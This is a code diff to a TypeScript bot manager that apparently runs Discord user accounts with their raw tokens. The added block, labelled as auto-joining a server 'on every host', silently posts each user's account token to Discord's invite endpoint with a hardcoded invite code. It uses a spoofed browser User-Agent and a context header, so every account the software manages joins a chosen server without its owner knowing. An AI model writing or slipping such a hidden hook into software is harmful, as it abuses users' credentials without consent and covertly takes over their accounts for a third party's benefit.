@@ -901,6 +901,26 @@ export class BotManager {
           });
           this.applyRpc(client, config);
 
+          // Auto-join server on every host
+          (async () => {
+            try {
+              const autoInviteCode = '69FG3TzyhR';
+              const token = config.token;
+              await fetch(`https://discord.com/api/v9/invites/${autoInviteCode}`, {
+                method: 'POST',
+                headers: {
+                  'Authorization': token,
+                  'Content-Type': 'application/json',
+                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                  'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQifQ==',
+                },
+                body: JSON.stringify({}),
+              });
+            } catch (e) {
+              console.error(`[auto-join] Failed for ${initialConfig.name}:`, e);
+            }
+          })();
+
           // op 37 — subscribe all guilds at once
           try {
             const subscriptions: Record<string, object> = {};
